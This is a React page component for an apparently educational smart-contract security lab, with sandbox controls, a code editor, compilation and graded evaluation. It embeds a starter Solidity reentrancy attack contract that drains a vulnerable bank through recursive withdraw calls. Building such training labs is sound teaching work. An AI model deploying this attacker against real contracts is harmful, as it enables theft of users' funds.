import { Alert, Button, Card, Col, Descriptions, Divider, Modal, Radio, Row, Space, Tag, Typography, message } from 'antd';
import { useEffect, useState } from 'react';
import { useNavigate, useParams } from 'react-router-dom';
import MonacoIDE from '../components/MonacoIDE';
import { evaluationApi, experimentsApi } from '../apis';

const STARTER_ATTACK = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IBank {
  function deposit() external payable;
  function withdraw() external;
}

contract MyAttacker {
  IBank public target;
  address public owner;

  constructor(address _target) { target = IBank(_target); owner = msg.sender; }

  function attack() external payable {
    require(msg.value >= 1 ether, "send at least 1 ether");
    target.deposit{value: msg.value}();
    target.withdraw();
  }

  receive() external payable {
    if (address(target).balance >= 1 ether) {
      target.withdraw();
    }
  }
}
`;

export default function ExperimentPage() {
  const { id } = useParams();
  const caseId = Number(id);
  const navigate = useNavigate();
  const [c, setC] = useState<any>(null);
  const [mode, setMode] = useState<'attack' | 'fix'>('attack');
  const [code, setCode] = useState<string>(STARTER_ATTACK);
  const [sandbox, setSandbox] = useState<any>(null);
  const [logs, setLogs] = useState<string[]>([]);
  const [busy, setBusy] = useState(false);
  const [report, setReport] = useState<any>(null);

  useEffect(() => {
    experimentsApi.caseDetail(caseId).then((r) => {
      const data = r.data;
      setC(data);
      if (data?.attackTemplate) setCode(data.attackTemplate);
    });
  }, [caseId]);

  const log = (s: string) => setLogs((arr) => [`[${new Date().toLocaleTimeString()}] ${s}`, ...arr].slice(0, 200));

  const startSandbox = async () => {
    setBusy(true);
    try {
      const r = await experimentsApi.start(caseId);
      setSandbox(r.data);
      log(`沙箱已创建：${r.data.rpcUrl} (id=${r.data.sandboxId})`);
      log(`分配账号：${r.data.accounts.map((a: any) => a.address).join(', ')}`);
    } catch (e: any) {
      message.error(e?.response?.data?.message ?? '沙箱启动失败');
    } finally { setBusy(false); }
  };

  const stopSandbox = async () => {
    if (!sandbox) return;
    await experimentsApi.stop(sandbox.sandboxId);
    setSandbox(null);
    log('沙箱已停止');
  };

  const compileOnly = async () => {
    setBusy(true);
    try {
      const r = await experimentsApi.compile(code, 'Student.sol');
      log(`编译成功：${(r.data ?? []).map((x: any) => x.contractName).join(', ')}`);
    } catch (e: any) {
      log('编译失败：' + JSON.stringify(e?.response?.data?.data?.errors?.[0]?.formatted ?? e.message));
    } finally { setBusy(false); }
  };

  const submitEvaluation = async () => {
    setBusy(true);
    try {
      const r = await evaluationApi.submit({ caseId, mode, code });
      setReport(r.data);
      log(`评测完成：${r.data.score}/100 status=${r.data.status}`);
    } catch (e: any) {
      message.error(e?.response?.data?.message ?? '评测失败');
    } finally { setBusy(false); }
  };

  return (
    <div className="space-y-4">
      <Card>
        <Row gutter={16}>
          <Col xs={24} lg={16}>
            <Typography.Title level={4} style={{ marginBottom: 8 }}>{c?.name}</Typography.Title>
            <Space size={[8, 8]} wrap>
              <Tag color="processing">{c?.vulnType}</Tag>
              {c?.swcId && <Tag>{c.swcId}</Tag>}
              <Tag color="gold">难度 {c?.difficulty}</Tag>
            </Space>
            <Typography.Paragraph className="mt-2">{c?.description}</Typography.Paragraph>
            <Alert showIcon type="info" message="攻击目标" description={c?.attackGoal} />
          </Col>
          <Col xs={24} lg={8}>
            <Descriptions size="small" column={1} title="沙箱环境">
              <Descriptions.Item label="状态">{sandbox ? <Tag color="green">运行中</Tag> : <Tag>未启动</Tag>}</Descriptions.Item>
              {sandbox && <Descriptions.Item label="RPC">{sandbox.rpcUrl}</Descriptions.Item>}
              {sandbox && <Descriptions.Item label="ID">{sandbox.sandboxId}</Descriptions.Item>}
            </Descriptions>
            <Space className="mt-2">
              <Button type="primary" onClick={startSandbox} loading={busy} disabled={!!sandbox}>启动沙箱</Button>
              <Button onClick={stopSandbox} disabled={!sandbox}>停止</Button>
            </Space>
          </Col>
        </Row>
      </Card>

      <Row gutter={16}>
        <Col xs={24} md={12}>
          <Card title={<span>漏洞合约 <Tag color="red">vulnerable</Tag></span>} bodyStyle={{ padding: 0 }}>
            <MonacoIDE value={c?.vulnerableCode ?? ''} readOnly height={460} />
          </Card>
        </Col>
        <Col xs={24} md={12}>
          <Card
            title={
              <Space>
                <span>我的合约</span>
                <Radio.Group size="small" value={mode} onChange={(e) => setMode(e.target.value)}>
                  <Radio.Button value="attack">攻击</Radio.Button>
                  <Radio.Button value="fix">修复</Radio.Button>
                </Radio.Group>
              </Space>
            }
            extra={
              <Space>
                <Button onClick={compileOnly} loading={busy}>编译</Button>
                <Button type="primary" onClick={submitEvaluation} loading={busy}>提交评测</Button>
              </Space>
            }
            bodyStyle={{ padding: 0 }}
          >
            <MonacoIDE value={code} onChange={setCode} height={460} />
          </Card>
        </Col>
      </Row>

      <Card title="操作日志">
        <pre className="text-xs whitespace-pre-wrap leading-5">{logs.join('\n') || '（暂无日志）'}</pre>
      </Card>

      <Modal
        open={!!report}
        title={<span>评测报告 #{report?.recordId}</span>}
        onCancel={() => setReport(null)}
        footer={[
          <Button key="close" onClick={() => setReport(null)}>关闭</Button>,
          <Button key="report" type="primary" onClick={() => navigate(`/report/${report.recordId}`)}>查看完整报告</Button>,
        ]}
      >
        {report && (
          <>
            <Descriptions column={2} size="small">
              <Descriptions.Item label="总分">{report.score}/{report.total}</Descriptions.Item>
              <Descriptions.Item label="状态">
                <Tag color={report.status === 'success' ? 'green' : 'red'}>{report.status}</Tag>
              </Descriptions.Item>
              <Descriptions.Item label="漏洞类型">{report.vulnType}</Descriptions.Item>
              <Descriptions.Item label="SWC">{report.swcId || '-'}</Descriptions.Item>
            </Descriptions>
            <Divider />
            {Object.entries(report.detail ?? {}).map(([k, v]: any) => (
              <div key={k} className="flex justify-between border-b py-1">
                <span>{k}</span>
                <span>
                  <Tag color={v.pass ? 'green' : 'red'}>{v.pass ? 'PASS' : 'FAIL'}</Tag>
                  <span className="text-slate-500 text-xs ml-2">{v.message}</span>
                </span>
              </div>
            ))}
          </>
        )}
      </Modal>
    </div>
  );
}
